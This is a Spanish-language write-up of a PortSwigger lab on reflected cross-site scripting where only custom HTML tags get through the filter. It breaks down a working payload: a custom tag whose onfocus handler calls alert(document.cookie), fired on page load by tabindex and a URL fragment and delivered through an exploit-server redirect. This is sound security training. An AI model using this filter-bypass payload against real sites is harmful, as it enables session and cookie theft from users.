# 3- Reflected XSS into HTML context with all tags blocked except custom ones

> This lab blocks all HTML tags except custom ones.
>
>  To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a custom tag and automatically alerts `document.cookie`.

En el lab nos presentan un **exploit server** que simula un server malicioso para craftear ataques

Por ejemplo en la pantalla por defecto lo que aparece la posibilidad de crear un exploit que nos lleve a un html y ejecute algo, en este caso aparece un Hola Mundo al ver el exploit

![](../../../.gitbook/assets/imagen%20%28933%29.png)

Mi link generado entonces: **https://exploit-ac921fda1f5116d9804a6c86019000ca.web-security-academy.net/exploit** al tocarlo nos lleva a un html que dice hello world!

Colocando el siguiente script en el body la pagina de exploit nos redirije a google:

```text
<script>
location = "https://www.google.com"
</script>
```

Sabemos que queremos llevar a una victima a ejecutar este codigo una vez llegue al link 

```text
https://ac7d1fc11f03161080bc6ca900ba0037.web-security-academy.net/?search=
```

Para probar nos colocamos sobre el buscador y realizando pasos similares al laboratorio anterior probamos mediante sniper todos los tags **custom brindados** en la xss cheatsheet



![](../../../.gitbook/assets/imagen%20%28932%29.png)

Permite todos los que quieras, es decir que si pones &lt;hola&gt; no lo toma como algo a bloquear, a diferencia de &lt;sc

![](../../../.gitbook/assets/imagen%20%28654%29.png)

Estudiando un poco la solucion brindada:

```text
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

Pasandola por un url decoder:

```text
<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x
```

Con esto podemos ver como: trata el `+` como espacio,  `<xss` es la custom tag que no es bloqueada como vimos antes.

`id=x`  Agrega un atributo id llamado x a la tag

`onfocus=alert(document.cookie)` marca que al hacerse focus sobre el html se ejecute el codigo

 onfocus is an event attribute where it will execute the javascript code when the HTML element that it is assigned to gets focus. The javascript code:`alert(document.cookie)` , will be executed once the event happened.

`#x` Esto hace que al entrar en la barra se haga focus solo a esto

`tabindex=1` para ser el primer lugar a donde viaja

Encodeado esto termina como la solucion marcada:

```text
https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x
```

Al llevar el exploit a la victima se ejecuta la accion deseada. 

